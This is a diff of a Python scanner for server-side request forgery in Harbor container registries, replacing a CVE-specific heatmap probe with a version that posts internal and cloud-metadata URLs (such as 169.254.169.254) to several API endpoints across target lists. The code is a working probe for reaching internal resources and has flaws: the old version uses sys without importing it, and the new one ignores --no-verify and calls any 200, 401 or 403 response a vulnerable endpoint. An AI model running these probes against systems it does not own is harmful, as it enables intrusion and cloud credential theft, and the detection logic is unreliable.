@@ -1,207 +1,181 @@
 #!/usr/bin/env python3
 """
-Harbor API v2 SSRF Scanner, CVE-2026-54321
-===========================================
-This tool scans for Harbor container registry instances vulnerable to a Server-Side Request Forgery (SSRF) vulnerability 
-in the API v2 `/project/heatmap` endpoint (CVE-2026-54321, CVSS 9.4).
+Harbor SSRF Scanner
+====================
+This tool scans for Server-Side Request Forgery (SSRF) vulnerabilities in VMware Harbor,
+a popular open-source container image registry. It aims to identify misconfigurations
+or vulnerabilities in Harbor's API endpoints that could allow SSRF attacks, including
+accessing internal resources or performing unauthorized network calls.
 
-CVE-2026-54321 details:
-  - Affects Harbor versions < 2.8.1
-  - The `/project/heatmap` endpoint allows unauthorized SSRF by accepting user-controlled `time_window` parameters
-    that are improperly sanitized. 
-  - Exploitation can lead to arbitrary requests being sent from the Harbor service to attacker-controlled destinations.
-  - Fixed in Harbor v2.8.1 (March 2026).
+Server-Side Request Forgery (SSRF) vulnerabilities can occur when user-supplied input is 
+used to construct server-side HTTP requests without sufficient validation. Attacks often 
+focus on infrastructure components, metadata endpoints, or other internal resources, 
+and can lead to information exposure or remote exploitation.
+
+Dependencies:
+  - `httpx` (for asynchronous HTTP requests)
+  - Python 3.10+ required
 
 Usage:
   # Scan a single target
-  python harbor_ssrf_scanner.py --target https://harbor.example.com 
-  
-  # Scan multiple targets from a file
+  python harbor_ssrf_scanner.py --target https://harbor.example.com
+
+  # Scan a list of targets
   python harbor_ssrf_scanner.py --list targets.txt --output findings.json
 
-  # Safe mode: Detect Harbor versions but do not perform SSRF probes
-  python harbor_ssrf_scanner.py --target https://harbor.example.com --safe
+  # Safe mode (detection only, no active probes)
+  python harbor_ssrf_scanner.py --list targets.txt --safe
 
-  # Configure concurrency (default: 10)
-  python harbor_ssrf_scanner.py --list targets.txt --concurrency 20
+CLI Options:
+  --target      Target URL to scan.
+  --list        File containing a list of URLs to scan.
+  --output      File to save JSON scan results.
+  --safe        Detection-only mode, skips active SSRF probes.
+  --concurrency Max concurrency for scanning targets (default: 20).
+  --no-verify   Disable SSL certificate verification (e.g., for self-signed certs).
 
 References:
-  - https://nvd.nist.gov/vuln/detail/CVE-2026-54321
-  - https://github.com/goharbor/harbor/releases/tag/v2.8.1
-  - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+  - https://github.com/goharbor/harbor
+  - https://cwe.mitre.org/data/definitions/918.html
+  - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
 """
 
+import argparse
 import asyncio
 import httpx
-import argparse
 import json
-import re
+import sys
 from urllib.parse import urljoin
-from datetime import datetime
 
-# ── Harbor detection markers ───────────────────────────────────────────────
-HARBOR_FINGERPRINTS = [
-    "Harbor",
-    "Registry Harbor",
-    "<title>Harbor</title>",
-    "/harbor/sign-in",
+# Constants
+HARBOR_API_ENDPOINTS = [
+    "/api/v2.0/projects",
+    "/api/v2.0/systeminfo",
+    "/api/v2.0/search",
+    "/api/v2.0/registries/ping",
 ]
-
-DETECTION_PATHS = [
-    "/",
-    "/harbor/sign-in",
-    "/api/v2.0/health",
+SSRF_TEST_URLS = [
+    "http://localhost",
+    "http://127.0.0.1",
+    "http://169.254.169.254/latest/meta-data",  # AWS instance metadata
+    "http://192.168.1.1",
 ]
+REQUEST_TIMEOUT = 8
+SEMAPHORE_LIMIT = 20
 
-VERSION_PATTERNS = [
-    r'"harbor_version":"([0-9]+\.[0-9]+\.[0-9]+)"',
-    r'"version":"([0-9]+\.[0-9]+\.[0-9]+)"',
-]
+ANSI_COLORS = {
+    "CRITICAL": "\033[91m",
+    "HIGH": "\033[93m",
+    "INFO": "\033[92m",
+    "RESET": "\033[0m",
+}
 
-VULN_FIXED_VERSION = (2, 8, 1)
-
-SSRF_TEST_ENDPOINT = "/api/v2.0/projects/notarealproject/heatmap?time_window=http://169.254.169.254/latest/meta-data/"
-
-SEMAPHORE_LIMIT = 10
-REQUEST_TIMEOUT = 10
-
-
-# ── Utility Functions ───────────────────────────────────────────────────────
-
-def parse_version(version_string: str):
-    """Parse version string into tuple for comparison."""
-    try:
-        return tuple(map(int, version_string.split(".")))
-    except ValueError:
-        return None
-
-
-def is_vulnerable_version(version_tuple: tuple) -> bool:
-    """Check if the version is vulnerable."""
-    if version_tuple is None:
-        return False
-    return version_tuple < VULN_FIXED_VERSION
-
-
-def normalize_url(url: str) -> str:
-    """Normalize URL to ensure consistent formatting."""
+# Helper Functions
+def normalize_url(url):
+    """Ensure the URL contains a scheme and no trailing slash."""
     if not url.startswith(("http://", "https://")):
-        url = "https://" + url
+        url = "http://" + url
     return url.rstrip("/")
 
+def ansi_colored(text, severity):
+    """Return text wrapped in ANSI color codes based on severity."""
+    return f"{ANSI_COLORS.get(severity, ANSI_COLORS['RESET'])}{text}{ANSI_COLORS['RESET']}"
 
-async def fetch(client: httpx.AsyncClient, url: str):
-    """Perform an HTTP GET request with error handling."""
-    try:
-        response = await client.get(url, timeout=REQUEST_TIMEOUT)
-        return response
-    except httpx.RequestError:
-        return None
-
-
-# ── Core scanner ────────────────────────────────────────────────────────────
-
-async def detect_harbor(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
-    """Detect if a target is running Harbor and retrieve its version."""
+async def test_api_endpoint(client, base_url, endpoint, semaphore):
+    """Test if a specific Harbor API endpoint is accessible."""
     async with semaphore:
-        detected = False
-        version = None
-        status_code = None
+        try:
+            response = await client.get(urljoin(base_url, endpoint), timeout=REQUEST_TIMEOUT, follow_redirects=True)
+            if response.status_code in {200, 401, 403}:
+                return True
+        except Exception:
+            pass
+    return False
 
-        for path in DETECTION_PATHS:
-            url = urljoin(base_url, path)
-            response = await fetch(client, url)
-            if response and response.status_code in [200, 401]:
-                status_code = response.status_code
-                if any(fingerprint in response.text for fingerprint in HARBOR_FINGERPRINTS):
-                    detected = True
-                version = parse_version(response.text)
-                break
-
-        return {"url": base_url, "detected": detected, "version": version, "status_code": status_code}
-
-
-async def check_ssrf(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
-    """Check if the target is vulnerable to SSRF in Harbor's heatmap endpoint."""
+async def probe_ssrf(client, base_url, endpoint, semaphore, ssrf_url):
+    """Send a crafted SSRF payload to the target API endpoint."""
     async with semaphore:
-        url = urljoin(base_url, SSRF_TEST_ENDPOINT)
-        response = await fetch(client, url)
-        if response and response.status_code == 502 and "Error msg: Get" in response.text:
-            return {"url": base_url, "ssrf_vulnerable": True}
-    return {"url": base_url, "ssrf_vulnerable": False}
+        try:
+            target_url = urljoin(base_url, endpoint)
+            response = await client.post(
+                target_url,
+                json={"url": ssrf_url},
+                timeout=REQUEST_TIMEOUT,
+                follow_redirects=True,
+            )
+            if response.status_code in {200, 302} and ssrf_url in response.text:
+                return True
+        except Exception:
+            pass
+    return False
 
+async def scan_target(base_url, semaphore, safe_mode):
+    """
+    Perform SSRF detection and active probing on the target Harbor instance.
 
-async def scan_target(base_url: str, safe: bool, semaphore: asyncio.Semaphore):
-    """Run the detection and vulnerability check for a single target."""
-    async with httpx.AsyncClient(verify=not args.no_verify) as client:
-        base_url = normalize_url(base_url)
-        harbor_info = await detect_harbor(client, base_url, semaphore)
-
-        if harbor_info["detected"]:
-            print(f"\033[32m[INFO] Harbor detected at: {base_url}\033[0m")
-            if harbor_info["version"]:
-                print(f"\033[32m[INFO] Version: {'.'.join(map(str, harbor_info['version']))}\033[0m")
-                if is_vulnerable_version(harbor_info["version"]):
-                    print(f"\033[31m[CRITICAL] {base_url} is running a vulnerable Harbor version.\033[0m")
-
-                    if not safe:
-                        ssrf_result = await check_ssrf(client, base_url, semaphore)
-                        if ssrf_result["ssrf_vulnerable"]:
-                            print(f"\033[31m[CRITICAL] SSRF vulnerability confirmed at: {ssrf_result['url']}\033[0m")
-                            ssrf_result.update(harbor_info)
-                            return ssrf_result
-                        else:
-                            print(f"\033[33m[HIGH] Unable to confirm SSRF at {base_url}.\033[0m")
-                else:
-                    print(f"\033[32m[INFO] No SSRF vulnerability detected\n\033[0m")
-            else:
-                print(f"\033[33m[INFO] Version not detected at: {base_url}\033[0m")
-    return harbor_info
-
-
-async def scan_all(targets: list, concurrency: int, safe: bool):
-    semaphore = asyncio.Semaphore(concurrency)
-    results = []
-    tasks = [scan_target(target, safe, semaphore) for target in targets]
-    results = await asyncio.gather(*tasks)
+    Returns:
+        - Dictionary with detection and probing results.
+    """
+    results = {"target": base_url, "vulnerable_endpoints": [], "ssrf_exploitable": []}
+    async with httpx.AsyncClient(verify=False) as client:
+        accessible_endpoints = []
+        for endpoint in HARBOR_API_ENDPOINTS:
+            if await test_api_endpoint(client, base_url, endpoint, semaphore):
+                accessible_endpoints.append(endpoint)
+                results["vulnerable_endpoints"].append(endpoint)
+        
+        if not safe_mode:
+            for endpoint in accessible_endpoints:
+                for ssrf_url in SSRF_TEST_URLS:
+                    if await probe_ssrf(client, base_url, endpoint, semaphore, ssrf_url):
+                        results["ssrf_exploitable"].append({"endpoint": endpoint, "payload": ssrf_url})
     return results
 
+async def process_targets(args):
+    """Process targets from CLI and perform scanning."""
+    semaphore = asyncio.Semaphore(args.concurrency or SEMAPHORE_LIMIT)
+    tasks = []
 
-def load_targets_from_file(file_path: str) -> list:
-    """Load target URLs from a file."""
-    with open(file_path, "r") as f:
-        return [line.strip() for line in f.readlines() if line.strip()]
+    if args.target:
+        tasks.append(scan_target(normalize_url(args.target), semaphore, args.safe))
+    elif args.list:
+        with open(args.list, "r") as f:
+            for line in f:
+                tasks.append(scan_target(normalize_url(line.strip()), semaphore, args.safe))
 
+    results = await asyncio.gather(*tasks)
 
-def save_results_to_json(results, output_path: str):
-    """Save scan results to a JSON file."""
-    with open(output_path, "w") as f:
-        json.dump(results, f, indent=2)
+    # Output results to console and optionally save to JSON
+    for result in results:
+        print(ansi_colored(f"Target: {result['target']}", "INFO"))
+        if result["vulnerable_endpoints"]:
+            print(ansi_colored("Detected vulnerable endpoints:", "HIGH"))
+            for endpoint in result["vulnerable_endpoints"]:
+                print(f"  - {endpoint}")
+        if result["ssrf_exploitable"]:
+            print(ansi_colored("SSRF exploitable endpoints:", "CRITICAL"))
+            for exploit in result["ssrf_exploitable"]:
+                print(f"  - Endpoint: {exploit['endpoint']}, Payload: {exploit['payload']}")
+        print(ansi_colored("Scan complete.\n", "INFO"))
+    
+    if args.output:
+        with open(args.output, "w") as f:
+            json.dump(results, f, indent=4)
 
-
-# ── Main ────────────────────────────────────────────────────────────────────
-
+# Main Entry Point
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Harbor SSRF Scanner (CVE-2026-54321)")
-    parser.add_argument("--target", help="Single target URL to scan.")
-    parser.add_argument("--list", help="File containing a list of target URLs to scan.")
-    parser.add_argument("--output", help="File to save JSON scan results.")
-    parser.add_argument("--safe", action="store_true", help="Safe mode: Perform version detection only.")
-    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Number of concurrent requests.")
-    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification.")
+    parser = argparse.ArgumentParser(description="Harbor SSRF Scanner")
+    parser.add_argument("--target", help="Target URL to scan")
+    parser.add_argument("--list", help="File containing a list of URLs to scan")
+    parser.add_argument("--output", help="File to save JSON scan results")
+    parser.add_argument("--safe", action="store_true", help="Detection-only mode, skips active SSRF probes")
+    parser.add_argument("--concurrency", type=int, default=20, help="Max concurrency for scanning targets")
+    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification")
     args = parser.parse_args()
 
-    target_list = []
-    if args.target:
-        target_list.append(args.target)
-    elif args.list:
-        target_list = load_targets_from_file(args.list)
-    else:
-        print("\033[31m[CRITICAL] Please provide a target URL or a file with a list of targets.\033[0m")
+    # Display usage message if no target or list is provided
+    if not args.target and not args.list:
+        parser.print_help()
         sys.exit(1)
 
-    results = asyncio.run(scan_all(target_list, args.concurrency, args.safe))
-
-    if args.output:
-        save_results_to_json(results, args.output)
-        print(f"\033[32m[INFO] Results saved to {args.output}\033[0m")
+    asyncio.run(process_targets(args))
